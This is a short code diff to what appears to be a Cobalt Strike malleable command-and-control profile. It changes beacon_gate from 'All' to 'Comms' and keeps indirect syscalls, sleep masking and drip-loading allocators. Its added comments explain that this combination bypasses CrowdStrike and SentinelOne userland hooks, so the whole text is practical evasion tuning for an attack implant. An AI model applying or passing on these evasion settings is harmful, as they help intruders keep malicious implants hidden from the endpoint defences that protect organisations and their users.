@@ -81,8 +81,15 @@ post-ex {}
 # stage {}
 sleep_mask "true", cleanup "true", syscall_method "Indirect"
 allocator "VirtualAlloc"   # required for drip loading
-rdll_use_driploading "true", beacon_gate { All; }
+rdll_use_driploading "true"
+beacon_gate { Comms; }     # NOT All - see below
 # No transform-obfuscate, no prepend/append in stage transforms
+
+# beacon_gate does obfuscated calls, NOT syscalls.
+# All = Core APIs use obfuscated calls instead of indirect syscalls,
+#        which gets caught by CrowdStrike/S1 hooks.
+# Comms = only masks HTTP APIs; Core APIs use syscall_method "Indirect"
+#          to bypass EDR userland hooks. This is the optimal combo.
 
 # process-inject {}
 allocator "VirtualAllocEx"  # required for drip loading
